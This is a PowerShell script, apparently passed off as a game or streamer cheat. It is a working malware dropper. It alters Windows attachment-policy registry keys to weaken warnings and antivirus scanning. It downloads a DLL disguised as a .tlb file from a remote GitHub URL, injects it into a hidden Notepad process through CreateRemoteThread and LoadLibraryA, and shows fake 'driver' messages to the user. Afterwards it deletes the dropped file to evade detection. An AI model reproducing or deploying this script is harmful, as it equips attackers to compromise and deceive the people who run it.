# Set attachment policy registry keys to suppress warnings (optional)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "SaveZoneInformation" -Value 2 -Type DWord
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" -Name "ScanWithAntiVirus" -Value 2 -Type DWord

# Download the DLL and save it
$dllUrl = "https://raw.githubusercontent.com/shivumang011/ShivUmangStreamerCheat/refs/heads/main/ShellJector.tlb"
$dllPath = "C:\Windows\ShellJector.tlb"
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing

# P/Invoke declarations
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
}
"@

# Constants
$PROCESS_ALL_ACCESS = 0x001F0FFF
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04

# Start Notepad silently
$notepad = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 2

Write-Host "Reconfiguring your Drivers..." -ForegroundColor ColorName -BackgroundColor red 

# Get Notepad's PID
$processId = $notepad.Id
Write-Output "Now Chill Babes . Your pc is successfully Connected With ShivUmang Streamer Cheat!"

# Open Notepad process
$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $processId)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "Failed to open Notepad process."
    exit
}

# Prepare DLL path
$bytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath + [char]0)  # null-terminated
$allocMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$bytes.Length, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
if ($allocMem -eq [IntPtr]::Zero) {
    Write-Error "Failed to allocate memory."
    exit
}

# Write DLL path to memory
$outSize = [IntPtr]::Zero
$writeResult = [Win32]::WriteProcessMemory($hProcess, $allocMem, $bytes, [uint32]$bytes.Length, [ref]$outSize)
if (-not $writeResult) {
    Write-Error "Failed to write memory."
    exit
}

# Get address of LoadLibraryA
$hKernel32 = [Win32]::GetModuleHandle("kernel32.dll")
$loadLibraryAddr = [Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
if ($loadLibraryAddr -eq [IntPtr]::Zero) {
    Write-Error "Failed to get address of LoadLibraryA."
    exit
}

# Create remote thread in Notepad
$threadId = [IntPtr]::Zero
$hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [ref]$threadId)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Error "Failed to create remote thread."
    exit
}

Write-Output "Ha Ha Kids Checkers Open Challenge No One Can Find It From Your Pc [Dev by ShivUmang]"


# Wait 5 seconds before cleanup
Start-Sleep -Seconds 5

Remove-Item "C:\Windows\ShellJector.tlb" -Force -ErrorAction SilentlyContinue
